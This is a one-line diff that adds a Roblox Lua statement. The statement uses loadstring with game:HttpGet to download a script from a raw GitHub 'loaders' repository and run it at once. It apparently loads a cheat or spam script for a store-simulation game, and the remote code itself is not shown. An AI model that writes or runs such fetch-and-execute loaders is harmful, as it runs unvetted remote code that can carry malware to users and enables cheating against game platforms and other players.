@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/run-a-sari-sari-store-spam6-9rc8rltho0p63r.lua"))()
